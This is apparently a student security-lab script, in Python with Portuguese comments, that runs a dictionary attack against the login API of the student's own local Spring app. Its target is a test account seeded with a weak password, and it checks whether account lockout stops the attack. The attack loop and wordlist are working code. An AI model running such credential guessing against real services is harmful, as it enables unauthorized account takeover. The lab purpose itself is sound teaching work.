"""
B5 - Ataque de dicionario contra o AdminShop.

Roda FORA do projeto Java, batendo na API via HTTP -- exatamente como um
atacante externo faria: sem acesso ao codigo-fonte, sem saber como a senha
esta armazenada, so testando combinacoes de login/senha ate uma funcionar.

Alvo: a conta "carlos.vendas" cadastrada de proposito em B4 com uma senha
fraca (mas que passa na politica minima do B1) -- "vendedor2024", seguindo
o padrao previsivel palavra+ano.

Como executar:
    pip install requests
    python ataque.py

Pre-requisito: o backend Spring precisa estar rodando em localhost:8080
(mvn spring-boot:run, ou Run no IntelliJ) antes de executar este script.
"""

import time
import requests

BASE_URL = "http://localhost:8080"
LOGIN_ENDPOINT = f"{BASE_URL}/login"

ALVO_USERNAME = "carlos.vendas"

# Wordlist baseada no padrao previsivel escolhido no B4 (palavra+numero/ano).
# Nao foi dada pronta -- construida a partir do padrao da propria senha fraca.
WORDLIST = [
    "vendedor123",
    "vendedor2023",
    "vendedor2024",  # <- senha real, propositalmente no meio da lista
    "vendedor2025",
    "carlos123",
    "carlos2024",
    "admin123",
    "senha123",
    "loja2024",
    "vendas2024",
    "Vendedor2024",
    "vendedor@2024",
]


def tentar_login(username: str, senha: str) -> dict:
    """Faz uma tentativa de login e devolve status HTTP + corpo da resposta."""
    payload = {"username": username, "senha": senha}
    try:
        resp = requests.post(LOGIN_ENDPOINT, json=payload, timeout=5)
        corpo = resp.json() if resp.content else {}
        return {"status": resp.status_code, "body": corpo}
    except requests.exceptions.RequestException as erro:
        return {"status": None, "body": {"erro": str(erro)}}


def parece_bloqueio(resultado: dict) -> bool:
    """Detecta se a resposta indica conta bloqueada (efeito do B3 em acao)."""
    mensagem = str(resultado["body"]).lower()
    return "bloqueada" in mensagem


def ataque_dicionario(username: str, wordlist: list[str]) -> str | None:
    print(f"Iniciando ataque de dicionario contra a conta: {username}")
    print(f"Total de tentativas na wordlist: {len(wordlist)}\n")

    for indice, senha in enumerate(wordlist, start=1):
        resultado = tentar_login(username, senha)
        status = resultado["status"]

        print(f"[{indice}/{len(wordlist)}] tentando senha '{senha}' -> status {status}")

        if status == 200:
            print(f"\nSENHA ENCONTRADA: '{senha}'")
            print(f"Tentativas necessarias: {indice}")
            return senha

        if status == 401 and parece_bloqueio(resultado):
            print(f"\nConta bloqueada apos {indice} tentativas. Ataque interrompido.")
            print("Isso e o bloqueio por tentativas (B3) funcionando -- mesmo")
            print("assim, a senha fraca continua existindo; o controle so")
            print("dificultou a descoberta por forca bruta, nao eliminou o risco.")
            return None

        # pequena pausa para nao martelar a API instantaneamente
        time.sleep(0.3)

    print("\nNenhuma senha da wordlist funcionou.")
    return None


if __name__ == "__main__":
    senha_encontrada = ataque_dicionario(ALVO_USERNAME, WORDLIST)

    print("\n" + "=" * 50)
    if senha_encontrada:
        print(f"RESULTADO: acesso obtido a conta '{ALVO_USERNAME}'")
        print(f"Senha descoberta: '{senha_encontrada}'")
        print("Papel comprometido: VENDEDOR")
        print("Ver Parte C do relatorio para a analise deste incidente.")
    else:
        print(f"RESULTADO: ataque nao teve sucesso contra '{ALVO_USERNAME}'")
    print("=" * 50)
